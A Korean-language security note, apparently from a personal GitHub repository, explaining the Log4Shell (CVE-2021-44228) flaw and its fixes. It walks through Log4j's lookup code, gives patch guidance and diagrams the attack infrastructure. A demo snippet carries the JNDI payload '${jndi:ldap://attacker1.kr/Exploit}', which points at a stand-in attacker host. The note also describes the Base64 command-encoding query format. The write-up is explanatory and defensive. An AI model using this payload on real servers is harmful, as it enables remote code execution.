- [로그에 대한 기본 지식](https://github.com/sungmin4036/infomation_security/blob/main/etc/log%20%EC%A0%95%EC%9D%98.md) 
- [log4j 보안 취약점 가이드](https://github.com/sungmin4036/infomation_security/blob/main/Recent_Issue/log4j%20%EB%B3%B4%EC%95%88%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EA%B0%80%EC%9D%B4%EB%93%9C.md)

---

### ㅁ 최초 취약점이면서 가장  파급력이 큰 Log4Shell(CVE-2021-44228) 취약점

- 취약점 개요

Log4Shell 취약점은 Log4j에서 구성, 로그 메시지 및 매개 변수에 사용되는 JNDI에서 발생하는 취약점으로, 공격자는 Lookup 기능을 악용하여 LDAP 서버에 로드된 임의의 코드를 실행할 수 있다.

```
- JNDI(Java Naming and Directory Interface) : Java 응용 프로그램이 필요한 자원 (데이터베이스 등) 및 실행에 필요한 다른 프로그램 정보를 찾을 수 있는 기능 제공

- Lookup : JNDI를 통해 찾은 자원을 사용하는 기능
```

![image](https://user-images.githubusercontent.com/62640332/160654704-392a9c1e-4f47-4409-a695-273c052290ce.png)

- 취약점 상세분석

```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);
    public static void main(String[] args) {
        //The default trusturlcodebase of the higher version JDK is false
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://attacker1.kr/Exploit}"); <<<<<<<<<<<< 이부분 문제
 }
}
```

Log4j에서는 로깅을 위해 org.apache.logging.log4j.core.Logger.log 메소드를 사용하며 

privateConfig.loggerConfig.getReliabilityStrategy()를 통해 설정 파일을 참고한다.

![image](https://user-images.githubusercontent.com/62640332/160654927-1b701a99-600a-483f-84c5-2c96a2f45c87.png)

이후 noLookups 옵션을 체크한 뒤 workingBuilder 변수에 ‘${’ 문자열을 찾아 

해당 문자열이 존재할 경우 config.getStrSubstitutor().replace() 메소드를 호출한다. 

config.getStrSubstitutor().replace() 메소드는 value 값을 인자 값으로 하여 StrSubstitutor.substitue() 메소드를 호출한다.

![image](https://user-images.githubusercontent.com/62640332/160655036-44e45215-7373-43db-b41a-414bb437e0fd.png)

StrSubstitutor.substitue() 메소드는 전달된 ${jndi:ldap://attacker1.kr/ Exploit} 

문자열에서 “$”, “{”, “}”을 제외한 값을 StrSubstitutor. resolveVariable() 메소드의 
인자로 전달한다.

이 값은 다시 resolve.lookup() 메소드로 실행된다.

![image](https://user-images.githubusercontent.com/62640332/160655177-ccc22358-e53d-40b1-90e7-d814819a6f58.png)

resolve.lookup() 메소드는 PREFIX_SEPARATOR를 기준으로 구분하여 prefix와 name 변수를 설정하고 prefix로 실행할 lookup() 메소드를 설정한다. 

![image](https://user-images.githubusercontent.com/62640332/160655256-31ea6f42-8c80-4c2b-8fe6-aad79635585f.png)

취약점 공격을 위해서는 JNDI를 사용하므로, JNDILookup.lookup() 메소드를 실행한다.

![image](https://user-images.githubusercontent.com/62640332/160655329-8ef5740c-193c-4e5d-b6c6-6715e28ccb51.png)

JNDILookup.lookup() 메소드는 다시 jndiManager.lookup() 메소드를 실행 한다. 

취약점은 바로 jndiManager.lookup() 메소드로 인해 발생한다. 

인자로 전달된 “ldap://attacker1.kr/Exploit”에 대한 검증 절차 없이 바로 lookup() 기능을 통해 접근을 시도하여 컨텍스트를 검색함으로써 공격자 LDAP 서버 (attacker1.kr)에 Exploit 엔티티를 요청하게 된다.

![image](https://user-images.githubusercontent.com/62640332/160655527-3b9a89ae-eb49-4c49-895c-7b1f34076509.png)


- 취약점 조치 방안

취약한 버전이 확인된 경우, 아래와 같이 JAVA 버전에 따라 Log4j를 최신 버전으로 업데이트하여야 한다. 

- JAVA 8 이상 2.17.1 이상
- JAVA 7 2.12.4 이상
- JAVA 6 2.3.2 이상

업데이트가 어려운 경우, 임시 조치 방안으로 JndiLookup 클래스만 제거한다.

```
JndiLookup 클래스를 제거 명령어 예시

* zip –q –d log4j-core-*.jar org/apache/logging/log4j/core/lookup/ JndiLookup.class
```

<br>
<br>
<br>

---

### ㅁ 취약점 악용 방식 및 유형

ㅁ  공격 인프라 구성요소

- 쿼리 송신서버 : 공격 쿼리를 송신하는 서버이다. log4j 취약점이 가장 많이 이용되는 부분이 자바 기반 웹서버의 로깅 기능이므로 웹 접속이 가능한 시스템이면 쿼리 송신이 가능하다.
- 쿼리 수신서버 : JNDI 공격 명령이 성공하였다면 공격자가 구축해놓은 쿼리 수신 서버로 쿼리를 전송하게 된다. 취약점에 악용되는 쿼리 수신 서비스는 LDAP과 RMI가 대표적이다. 대부분의 공격자들은 추적을 피하기 위해 정상적인 서비스를 운영중인 서버를 해킹하여 공격 쿼리 서비스를 구축한다. 이때 서비스 프로그램의 구성에 따라 추후 행동하는 공격 패턴이 달라진다.
- Class 파일 유포서버 : 피해 시스템은 쿼리 수신 서버로부터의 명령을 받아 악성 Class 파일을 다운 받는다. 다운로드는 보통 웹 프로토콜을 통해 수행된다. 
- 악성코드 유포 서버 : Class 파일에 정의된 명령에 따라 추가 악성코드를 다운로드 받는다. 이 때 최종 악성코드를 배포할 수 있는 악성코드 유포 서버가 추가로 필요하다.

ㅁ 공격망 구성 방식


- 공격 쿼리가 고정된 유형
  
![image](https://user-images.githubusercontent.com/62640332/160656261-3a9829ed-ac39-43e5-a1ba-65b3667d690c.png)

- 공격 쿼리가 Base64로 인코딩된 유형

![image](https://user-images.githubusercontent.com/62640332/160656299-51983388-ae6b-4ed7-a031-2803ad0553ce.png)

- 공격 쿼리가 랜덤으로 생성되는 유형

![image](https://user-images.githubusercontent.com/62640332/160656349-8935ec12-7edb-4024-a612-82eafafa4e91.png)

ㅁ 공격 쿼리가 고정된 유형 상세 개요도 

![image](https://user-images.githubusercontent.com/62640332/160656419-16c00a43-078e-4d82-98ca-1ac0b217a98d.png)

① 공격자는 쿼리 송신 서버에서 공격 쿼리를 웹 패킷에 담아 피해 서버에 보낸다.

② 피해 서버의 취약한 log4j는 공격자가 발송한 웹 패킷에 포함된 공격 쿼리 부분을 추출하여 다시 공격자의 쿼리 수신 서버로 전송한다. 

③ 쿼리 수신 서버는 피해 서버에게 악성 Class 파일을 다운로드하라는 명령을 전달한다.

④ 피해 서버는 Class 파일 유포 서버에서 악성 Class 파일을 다운로드 받고, Class 파일에 정의되어 있는 명령을 실행한다.

⑤ 명령의 결과로 악성코드 유포지에서 최종 목적의 악성코드가 다운로드 된다.



ㅁ 공격 쿼리가 Base64로 인코딩된 유형 상세 개요도

![image](https://user-images.githubusercontent.com/62640332/160656554-19230ee2-cc32-4b6b-b1a9-fa458c6c74a6.png)

① 공격자는 쿼리 송신 서버에서 인코딩 된 명령어를 웹 패킷에 담아 피해 서버로 보낸다.

```
인코딩 된 명령어 : “/Basic/Command/Base64/” 문자열 뒤에 실행시킬 명령어를 덧붙여 Base64로 인코딩
```

② 피해 서버의 취약한 log4j는 공격자가 발송한 웹 패킷에 포함된 공격 쿼리 부분을 추출하여 다시 공격자의 쿼리 수신 서버로 전송한다. 

③ 쿼리 수신 서버는 피해 서버에게 악성 Class 파일을 다운로드하라는 명령을 전달한다.

④ 피해 서버는 쿼리 수신 서버의 웹포트로 접속하여 ‘Exploit’ 문자와 랜덤 10글자로 조합된 파일명을 가진 악성 Class 파일을 다운로드 및 실행하여 명령을 수행한다.

⑤ 명령의 결과로 악성코드 유포지에서 최종 악성코드가 다운로드 된다.




ㅁ 공격 쿼리가 랜덤으로 생성되는 유형 상세 개요도

![image](https://user-images.githubusercontent.com/62640332/160656910-daf5c1a7-faea-4b0c-8484-88025e7a82e8.png)



① 공격자는 쿼리 수신 서버를 구성할 때 공격 명령어를 미리 지정한다.

② 명령어 지정을 통해 쿼리에 쓰일 이름을 랜덤 문자 6자리로 생성한다.

③ 공격자는 쿼리 송신 서버에서 공격 쿼리를 웹 패킷에 담아 피해 서버에 보낸다.

④ 피해 서버의 취약한 log4j는 공격자가 발송한 웹 패킷에 포함된 공격 쿼리 부분을 추출하여 다시 공격자의 쿼리 수신 서버로 전송한다. 

⑤ 쿼리 수신 서버는 피해 서버에게 악성 Class 파일을 다운로드하라는 명령을 전달한다.

⑥ 피해 서버는 쿼리 수신 서버의 웹포트로 접속하여 ‘ExecTemplateJDK’ 문자와 JDK 버전 정보로 조합된 파일명을 가진 악성 Class 파일을 다운로드 및 실행하여 명령을 수행한다.

⑦ 명령의 결과로 악성코드 유포지에서 최종 악성코드가 다운로드 된다.

- JNDI란?

JNDI는 RMI, LDAP, Active Directory, DNS, CORBA 등과 같은 서로 다른 네이밍 및디렉터리 서비스와 상호 작용할 수 있는 하나의 공통 인터페이스를 제공하기 위한 java 기반의 인터페이스이다. 

네이밍 서비스와 디렉터리 서비스에 대한 정의는 다음과 같다.

- 네이밍 서비스(Naming Service) : “바인딩(Bindings)”이라고도 불리는 이름과 값으로 구성된 엔티티로, “조회(Search)” 또는 “검색(Lookup)” 연산을 사용하여 이름을 기반으로 객체를 찾을 수 있는 기능 제공
- 디렉터리 서비스(Directory Service) : 디렉터리 객체(Directory Objects)를 저장하고 검색할 수 있는 특별한 유형의 네이밍 서비스. 디렉터리 객체는 속성을 객체에 연결할 수 있다는 점에서 일반 객체와 차이점을 가지며, 따라서 디렉터리 서비스는 객체 속성에서 작동할 수 있는 확장 기능 제공


◆ JNDI는 네이밍 또는 디렉터리 서비스의 자바 객체에 바인딩하기 위해 자바 직렬화를 사용하여 해당 객체를 Byte 단위로 가져온다. 객체의 직렬화 된 상태가 너무 클 경우를 대비하여, 객체를 네이밍 또는 디렉터리 서비스에 간접적으로 저장하여 관리하기 위해 참조(Reference)를 사용한다. 

레퍼런스는 네이밍 매니저(Naming Manager)에 의해 디코딩되어 원래 객체를 참조할 수 있도록 객체에 대한 주소와 클래스 정보로 구성되며, 아래와 같이 사용할 수 있다.
 
```
Reference reference = new 
Reference("MyClass","MyClass",FactoryURL);
ReferenceWrapper wrapper = new ReferenceWrapper(reference);
ctx.bind("Foo", wrapper);
```

◆ Reference 클래스는 팩토리(Factory)를 사용하여 객체를 구성할 수 있는데, 외부에 존재하는 팩토리 클래스도 참조가 가능하여 공격자들이 관심을 가지는 공격 방식이다. 

이 공격방식은 지난 2016년 블랙햇 USA에서도 발표된 바가 있다.

◆ 또한, JNDI 원격 클래스를 로드하는 것은 어느 레벨에서 실행되는 지에 따라 다르게 동작한다.

네이밍 매니저(Naming Manager) 레벨에서 실행하는 것과 SPI (Service Provider Interface) 레벨에서 실행하는 것으로 구분된다.

![image](https://user-images.githubusercontent.com/62640332/160657461-e57e02e6-6f86-4e81-9210-e259eaba2f54.png)

SPI의 경우 원격의 클래스를 실행할 때 특정 Provider에 따라 Security Manager를 
적용할 수 있다.

![image](https://user-images.githubusercontent.com/62640332/160657509-bdb1ebff-68b7-48ca-b65f-136e772106d0.png)

◆ 반면, 네이밍 매니저의 경우 JNDI 네이밍 레퍼런스(Naming Reference)를 디코딩 할 때항상 원격에 존재하는 클래스를 로드할 수 있으며, 

이를 사용하지 않도록 하는 JVM 옵션이 없고 설치된 Security Manager를 적용하지 않는다. 공격자는 이러한 특징을 이용하여 원격으로 자체 코드를 실행할 수 있게 된다
